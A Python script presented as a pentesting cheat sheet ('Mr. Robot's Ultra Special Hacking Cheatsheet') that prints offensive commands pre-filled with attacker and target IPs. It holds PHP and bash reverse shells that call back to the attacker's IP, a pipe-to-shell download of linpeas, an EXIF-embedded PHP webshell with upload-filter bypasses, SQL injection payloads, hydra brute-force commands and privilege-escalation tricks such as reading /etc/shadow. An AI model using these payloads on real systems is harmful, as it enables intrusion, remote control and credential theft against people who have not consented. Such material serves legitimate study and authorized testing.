#!/usr/bin/env python3

import os
import subprocess
import sys

# This script is for pentesting/learning security practices.
# Still have to add a bunch of LFI/RFI stuff, IDOR as well
# Always check cookies...

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

import subprocess

def get_myip(default="127.0.0.1"):
    devices = ["tun0", "eth0", "ens33", "eth1", "wg-mullvad", "wlp61s0"]
    for device in devices:
        try:
            myip = subprocess.check_output(["ifconfig", device]).decode().split("inet ")[1].split()[0]
            if all(part.isdigit() and 0 <= int(part) <= 255 for part in myip.split(".")):
                return myip
        except subprocess.CalledProcessError:
            pass

    interfaces = subprocess.check_output(["ifconfig", "-s"]).decode().splitlines()
    interfaces = [i.split()[0] for i in interfaces if i.startswith("enp")]
    for interface in interfaces:
        try:
            myip = subprocess.check_output(["ifconfig", interface]).decode().split("inet ")[1].split()[0]
            if all(part.isdigit() and 0 <= int(part) <= 255 for part in myip.split(".")):
                return myip
        except subprocess.CalledProcessError:
            pass

    try:
        myip = subprocess.check_output(["curl", "-s", "ifconfig.me"]).decode().strip()
        if all(part.isdigit() and 0 <= int(part) <= 255 for part in myip.split(".")):
            return myip
    except subprocess.CalledProcessError:
        pass

    return default
    
clear_screen()

if not os.path.exists("/usr/bin/gnome-terminal"):
    gnome = "Shell wont work until you run: sudo apt-get install gnome-terminal"
else:
    gnome = ""
    
def shellprompt():
    query = input(f"Type 'shell' to open a new terminal window or press enter to return to menu): ")
    if query.lower() == "shell":
        shell_info()
        return # return to the menu
    elif not query:
        return # return to the menu

def one_info(myip, T, TD):
    print("\033[35mRustscan can be used for quick port scanning\033[0m")
    print(f"rustscan -g -a {T} | cut -f 2 -d '[' | cut -f 1 -d ']'\n")
    print("\033[35mThen we can pipe it into nmap with the ports we found for futher information where the ports are what we found from rustscan\033[0m")
    print(f"nmap -sC -sV {T} -p 80,443,9090\n")
    print("\033[35mGeneral Enumeration:\033[0m")
    print(f"nmap -vv -Pn -A -sC -sS -T 4 -p- {T}")
    print("\033[35mVerbose, syn, all ports, all scripts, no ping\033[0m")
    print(f"nmap -v -sS -A -T4 {T}\n")
    print("\033[35mVerbose, SYN Stealth, Version info, and scripts against services.\033[0m")
    print(f"nmap –script smb-check-vulns.nse –script-args=unsafe=1 -p445 {T}\n")
    print("\033[35mSMTP Enumeration\033[0m")
    print(f"nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {T}\n")
    print("\033[35mMySQL Enumeration\033[0m")
    print(f"nmap -sV -Pn -vv {T} -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122\n")
    shellprompt()

def two_info(myip, T, TD):
    print("\033[35mWe can use wfuzz to try and find subdomains if we have found a domain name or vhost such as website.com\033[0m")
    print("wfuzz -v -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -Z -H \"Host: FUZZ.google.com\" http://google.com")
    shellprompt()

def three_info(myip, T, TD):
    print("\033[35mWe can use whatweb or httpx to check what a subdomain, subfolder or domain is hosting including version numbers\033[0m")
    print(f"whatweb {T}")
    print(f"/usr/local/bin/httpx -status-code -title -tech-detect {T} -p 8080,443,80,9999 2>&1")
    print(f"whatweb {TD}")
    print(f"/usr/local/bin/httpx -status-code -title -tech-detect {TD} -p 8080,443,80,9999 2>&1")
    shellprompt()

def four_info(myip, T, TD):
    print("\033[35mIf you have logged into the site, make sure to run it with cookies using --cookies= to possible find more results\033[0m")
    print(f"dirsearch -u {T} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie= --exclude-subdirs=js,css")
    print(f"dirsearch -u {TD} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x 404 --exit-on-error -t 20 --cookie= --exclude-subdirs=js,css")
    print("")
    print("\033[35mGobuster is an alternative for directory finding\033[0m")
    print(f"gobuster  dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://{T} -x php,txt,html,sh,cgi")
    print(f"gobuster  dir --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -u http://{TD} -x php,txt,html,sh,cgi")
    shellprompt()

def five_info(myip, T, TD):
    print("\033[35mTo host a local folder make sure you are in that folder within the terminal you run this command\033[0m")
    print("python3 -m http.server 80")
    shellprompt()

def six_info(myip, T, TD):
    print("\033[35mWordpress scanning is easy, if you have an API key from wpscan.com use the api-token parameter --api-token=\033[0m")
    print(f"wpscan --url http://{T} --enumerate u,vp,vt")
    print(f"wpscan --url http://{TD} --enumerate u,vp,vt")
    shellprompt()

def seven_info(myip, T, TD):
    print("\033[35mJust a reminder of common folder/files to check\033[0m")
    print("/robots.txt /crossdomain.xml /clientaccesspolicy.xml /phpinfo.php /sitemap.xml /.git")
    shellprompt()

def eight_info(myip, T, TD):
    print("\033[35mIf you find fields that look like they might be injected with post data in the URL - also check for post data in burp\033[0m")
    print(f"sqlmap -u \"https://{T}/index.php?m=Index\" --level 5 --risk 3 --dump")
    shellprompt()

def nine_info(myip, T, TD):
    print("\033[35mCommon SMB commands\033[0m")
    print(f"smbclient -L //{T} -U """)
    print(f"smbmap -H {T}")
    print(f"showmount -e {T}")
    print("\033[35m#If showmount works\033[0m")
    print(f"mount {T}:/vol/share /mnt/nfs  -nolock")
    print(f"smbget -R smb://{T}/anonymous")
    print(f"nmblookup -A {T}")
    shellprompt()

def ten_info(myip, T, TD):
    print("\033[35mCommon hydra commands\033[0m")
    print(f"hydra -l root -P passwords.txt -t 32 {T} ftp")
    print(f"hydra -L usernames.txt -P pass.txt {T} mysql")
    print(f"hydra -l Administrator -P words.txt {T} smb -t 1")
    print(f"hydra -l root -P /usr/share/wordlists/rockyou.txt {T} smtp -V")
    print(f"hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 {T} ssh")
    print(f"hydra -l root -P /usr/share/wordlists/rockyou.txt -t 32 {T} telnet")
    print(f"hydra -L /root/Desktop/usernames.txt \u2013P /root/Desktop/pass.txt -s <PORT> {T} vnc")
    shellprompt()

def eleven_info(myip, T, TD):
    print("\033[35mNetcat is helpful\033[0m")
    print("nc -lvnp 1234")
    shellprompt()

def twelve_info(myip, T, TD):
    print("\033[35mPHP reverse shell\033[0m")
    print(f"php -r '$sock=fsockopen(\"{myip}\",4242);exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print(f"php -r '$sock=fsockopen(\"{myip}\",4242);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print(f"php -r '$sock=fsockopen(\"{myip}\",4242);`/bin/sh -i <&3 >&3 2>&3`;'")
    print(f"php -r '$sock=fsockopen(\"{myip}\",4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print(f"php -r '$sock=fsockopen(\"{myip}\",4242);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'")
    print(f"php -r '$sock=fsockopen(\"{myip}\",4242);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'")
    shellprompt()

def thirteen_info(myip, T, TD):
    print("\033[35mSSH id_rsa file?\033[0m")
    print("chmod 400 id_rsa")
    print("/usr/share/john/ssh2john.py id_rsa > id_rsa.john")
    print("john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john")
    print(f"ssh -i id_rsa username@{T} -p 22")
    shellprompt()

def fourteen_info(myip, T, TD):
    print("\033[35mFTP Stuff\033[0m")
    print(f"wget -m ftp://anonymous:anonymous@{T}")
    print(f"nmap \u2013script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 {T}")
    shellprompt()

def fifteen_info(myip, T, TD):
    print("\033[35mDig for DNS stuff\033[0m")
    print(f"dig {T}")
    shellprompt()

def sixteen_info(myip, T, TD):
    print("\033[35mFind SUID files\033[0m")
    print("find / -perm -u=s -type f 2>/dev/null")
    print("")
    print("\033[35mLocate the SUID root file\033[0m")
    print("find / -user root -perm -4000 -print")
    print("")
    print("\033[35mLocate the SGID root file\033[0m")
    print("find / -group root -perm -2000 -print")
    print("")
    print("\033[35mLocate the SUID and SGID files:\033[0m")
    print("find / -perm -4000 -o -perm -2000 -print")
    print("")
    print("\033[35mFind files that do not belong to any user:\033[0m")
    print("find / -nouser -print")
    print("")
    print("\033[35mLocate a file that does not belong to any user group:\033[0m")
    print("find / -nogroup -print")
    print("")
    print(f"curl -L {myip}/linpeas.sh | sh")
    print("")
    print(f"wget {myip}/linpeas.sh")
    print("")
    print("crontab -e")
    print("")
    print("\033[35mPython to bash shell\033[0m")
    print("python -c 'import pty;pty.spawn(\"/bin/bash\")'")
    print("")
    print("find / -name id_rsa 2> /dev/null")
    print("")
    print("find / -name authorized_keys 2> /dev/null")
    print("")
    print("cat ~/.bash_history")
    print("")
    print("sudo find /bin -name nano -exec /bin/sh \\;")
    print("")
    print("sudo awk 'BEGIN {system(/bin/sh)}'")
    print("")
    print("sudo apache2 -f /etc/shadow")
    print("")
    print("find / -type f -perm -04000 -ls 2>/dev/null")
    print("")
    print("strace /usr/local/bin/suid-so 2>&1 | grep -i -E 'open\\|access\\|no such file'")
    print("")
    print("getcap -r / 2>/dev/null")
    print("")
    print(f"bash -i >& /dev/tcp/{myip}/4444 0>&1")
    print("")
    print("\033[35mRemember to check https://gtfobins.github.io/\033[0m")
    shellprompt()

def seventeen_info(myip, T, TD):
    print("\033[35mDownloading php reverse shell and creating a bunch of variants to try uploading\033[0m")
    print("\033[35mRemember to use burpsuite when trying to bypass file upload fields.\033[0m")
    print("\033[35mThis section will create a few variants to bypass upload filters\033[0m")
    print("\033[35mCopy paste from mkdir to the last echo line so you can find where they are created.\033[0m")
    print("mkdir phpreverseshell")
    print("wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -P phpreverseshell/")
    print(f"sed -i \"s/{T}/{myip}/\" phpreverseshell/php-reverse-shell.php")
    print("echo 'GIF89a;' | cat - phpreverseshell/php-reverse-shell.php > temp && mv temp phpreverseshell/php-reverse-shell.php")
    print("cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.png")
    print("cp phpreverseshell/php-reverse-shell.php phpreverseshell/php-reverse-shell.php.jpg")
    print("export directory=/home/robot/question")
    print("clear")
    print(f"echo Your shells will be located in $directory/phpreverseshell/ with the reverse connection IP {myip}")
    print("")
    print("\033[35mNow we will create an exif variant/lfi variant. When uploaded use Tux.jpg?cmd=whoami\033[0m")
    print("wget https://upload.wikimedia.org/wikipedia/commons/5/56/Tux.jpg -P phpreverseshell/")
    print("exiftool -Comment='<?php echo \"<pre>\"; system($_GET['cmd']); ?>' phpreverseshell/Tux.jpg")
    print("mv phpreverseshell/Tux.jpg phpreverseshell/Tux.php.jpg")
    print("")
    print("\033[35mMake sure to replace (Content-type: application/x-php) with (Content-type: image/jpeg) using burpsuite)\033[0m")
    print("")
    print("\033[35mUploading file via CURL if the PUT option is available:\033[0m")
    print(f"curl --upload-file phpreverseshell/php-reverse-shell.php --url http://{T}/test/shell.php --http1.0")
    shellprompt()

def eigtheen_info(myip, T, TD):
    print("\033[35mDNS Zone Transfers\033[0m")
    print(f"dnsrecon -d {T} -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml")
    shellprompt()

def nineteen_info(myip, T, TD):
    print("\033[35mCommon SQL Injections\033[0m")
    print("admin' --")
    print("admin' #")
    print("admin'/*")
    print("' or 1=1--")
    print("' or 1=1#")
    print("' or 1=1/*")
    print("') or '1'='1--")
    print("') or ('1'='1\u2014")
    shellprompt()

def twenty_info(myip, T, TD):
    print("\033[35mPassword cracking hashes/files\033[0m")
    print("")
    print("\033[35mHashcracking with hashcat\033[0m")
    print("hashcat -m 400 -a 0 hash.txt /root/rockyou.txt")
    print("")
    print("\033[35mCracking the password for an image file\033[0m")
    print("stegseek file.jpg")
    print("")
    print("\033[35mCrack zip file password\033[0m")
    print("sudo fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip")
    shellprompt()

def exit_menu():
    print('Goodbye!')
    exit()

def ninetynine_info(myip, T, TD):
    print("\033[35mEnumerating SNMP\033[0m")
    print("snmpget -v 1 -c public {T}")
    print("snmpwalk -v 1 -c public {T}")
    print("snmpbulkwalk -v2c -c public -Cn0 -Cr10 {T}")
    print("")
    print("\033[35mFind processes running\033[0m")
    print("ps aux")
    print("")
    print("\033[35mFinding Exif data on a file\033[0m")
    print("exiftool file.jpg")
    print("")
    print("\033[35mCompiling Exploits\033[0m")
    print("gcc -o exploit exploit.c")
    print("")
    print("\033[35mCompile .exe on linux\033[0m")
    print("")
    print("\033[35mRemember to check for LFI example below, change index to a path you know\033[0m")
    print("/?view=./index/../../../../../../../var/log/apache2/access.log&ext")
    print("")
    print("i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe")
    shellprompt()

def shell_info():
    if sys.platform.startswith('win32'):
        # For Windows using Command Prompt
        subprocess.call(['start', 'cmd'])
    elif sys.platform.startswith('darwin'):
        # For macOS using Terminal
        subprocess.call(['open', '-a', 'Terminal'])
    elif sys.platform.startswith('linux'):
        # For Linux using GNOME Terminal
        subprocess.call(['gnome-terminal'])
    else:
        print("Unknown operating system, can't open a new terminal.")

def menu(myip, T, TD):
    clear_screen()
    print(gnome)
    print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⢀⠀⠀⠀⠊⣉⡉⠄⠀⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠠⠂⠀⣀⠠⡀⠈⠀⡀⠀⠀⠂⠄⠀⢀⠀")
    print("⠀⠁⠉⠉⠁⠀⠀⠀⠌⠉⠙⠀⠀⠀⠐⠉⠉⠀⠃")
    print("⠀⢇⠈⠉⠀⠂⠀⠀⠀⠉⠁⡀⠀⠀⠇⠈⠉⠀⠂")
    print("⠈⢀⠒⠒⠊⠀⠉Welcome⠁⠐⠒⠒⠂⠂")
    print("⠀⠆⠘⠙⠀⠀⠀⠀To the⠀⠆⠘⠛⢈⠀")
    print("⠀⠈⠖⠒⠂ Simulation⠒⠒⠂⠄")
    print("⠀⡆⠐⠒⠀⠄⠀⠀⠀⠒⠂⠀⠀⠀⡆⠐⠒⠀⠄")
    print("⠐⡈⠤⠤⠔⠀⠒⠀⡢⠤⠤⠁⠒⠂⠠⠤⠤⠄⠄")
    print("⠀⠀⠀⠈⠄⠀⠀⠐⠀⠶⠆⠡⠀⠀⠄⠂⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠂⠄⠀⠀⠂⠁⠀⠀⠀⠀⠀⠀")
    print("⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀")
    print("Remember to ALWAYS check for each service on each subdomain. Also check all directories on different ports. This script does not autofill the ports you find")
    print("THE POWER OF IDOR COMPELLS YOU. Check for cookie and URL based idor immediately. Everytime.")
    print("\033[35mScript will default to Tun0 OpenVPN IP for you and add it to commands otherwise tries Public IP, then IPv4 if that fails.\033[0m")
    print("\033[1mMr. Robot's Ultra Special Hacking Cheatsheet\033[0m - \033[31mSometimes you just need a reminder of where to look next.\033[0m")
    print(f"Your IP {myip} | Your targets IP {T} | Your targets domain: {TD}")
    print("\033[32m(0) Manually input your IP, Target IP and Domain to change the script variables.\033[0m")
    print("\033[32m(1) Port Scan Commands\033[0m")
    print("\033[32m(2) Subdomain Scan Commands\033[0m")
    print("\033[32m(3) CMS checking Commands\033[0m")
    print("\033[32m(4) Directory checking commands\033[0m")
    print("\033[32m(5) Host a local folder\033[0m")
    print("\033[32m(6) Wordpress scanning\033[0m")
    print("\033[32m(7) Common files to check\033[0m")
    print("\033[32m(8) SQL injection\033[0m")
    print("\033[32m(9) SMB tools\033[0m")
    print("\033[32m(10) Hydra bruteforcing\033[0m")
    print("\033[32m(11) Netcat Listener\033[0m")
    print("\033[32m(12) PHP reverse shell\033[0m")
    print("\033[32m(13) SSH/ID_RSA how to\033[0m")
    print("\033[32m(14) FTP Stuff\033[0m")
    print("\033[32m(15) DNS/Dig stuff\033[0m")
    print("\033[32m(16) Privelege Escalation Commons\033[0m")
    print("\033[32m(17) File upload bypasses\033[0m")
    print("\033[32m(18) DNS Zone Transfers\033[0m")
    print("\033[32m(19) Common SQL Injections\033[0m")
    print("\033[32m(20) Cracking files/hashes\033[0m")
    print("\033[32m(shell) Open a new terminal\033[0m")
    print("\033[32m(exit) ... Obviously to exit\033[0m")
    print("\033[32m(99) Helpful commands to remember\033[0m")
    selection = input("Enter your selection: ")
    clear_screen()
    if selection == "0":
        myip = input('Enter Your IP Machines IP: ').strip()
        T = input('Enter Target Machines IP: ').strip()
        TD = input('Enter Target domain (google.com) - You can always fill this in later once you find it: ').strip()
        input('Press enter to return to menu...')
        menu(myip, T, TD)
    elif selection == "1":
        one_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "2":
        two_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "3":
        three_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "4":
        four_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "5":
        five_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "6":
        six_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "7":
        seven_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "8":
        eight_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "9":
        nine_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "10":
        ten_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "11":
        eleven_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "12":
        twelve_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "13":
        thirteen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "14":
        fourteen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "15":
        fifteen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "16":
        sixteen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "17":
        seventeen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "18":
        eigtheen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "19":
        nineteen_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "20":
        twenty_info(myip, T, TD)
        menu(myip, T, TD)
    elif selection == "shell":
        shell_info()
        menu(myip, T, TD)
    elif selection == "exit":
        exit_menu()
    elif selection == "99":
        ninetynine_info(myip, T, TD)
        menu(myip, T, TD)
    else:
        print('Invalid choice. Try again.')
        menu(myip, T, TD)

global T
global TD
global myip
print("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀")
print("⠀⠀⠀⠀⢀⠀⠀⠀⠊⣉⡉⠄⠀⠀⠀⠀⠀⠀⠀")
print("⠀⠀⠀⠠⠂⠀⣀⠠⡀⠈⠀⡀⠀⠀⠂⠄⠀⢀⠀")
print("⠀⠁⠉⠉⠁⠀⠀⠀⠌⠉⠙⠀⠀⠀⠐⠉⠉⠀⠃")
print("⠀⢇⠈⠉⠀⠂⠀⠀⠀⠉⠁⡀⠀⠀⠇⠈⠉⠀⠂")
print("⠈⢀⠒⠒⠊⠀⠉Welcome⠁⠐⠒⠒⠂⠂")
print("⠀⠆⠘⠙⠀⠀⠀⠀To the⠀⠆⠘⠛⢈⠀")
print("⠀⠈⠖⠒⠂ Simulation⠒⠒⠂⠄")
print("⠀⡆⠐⠒⠀⠄⠀⠀⠀⠒⠂⠀⠀⠀⡆⠐⠒⠀⠄")
print("⠐⡈⠤⠤⠔⠀⠒⠀⡢⠤⠤⠁⠒⠂⠠⠤⠤⠄⠄")
print("⠀⠀⠀⠈⠄⠀⠀⠐⠀⠶⠆⠡⠀⠀⠄⠂⠀⠀⠀")
print("⠀⠀⠀⠀⠀⠀⠀⠂⠄⠀⠀⠂⠁⠀⠀⠀⠀⠀⠀")
print("⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀")
T = input('Enter Target Machines IP: ').strip()
TD = input('Enter Target domain (google.com) - You can always fill this in later once you find it: ').strip()
myip = get_myip()
if myip is not None:
    print(f"The IP address is {myip}")
else:
    print("Unable to determine IP address.")
menu(myip, T, TD)
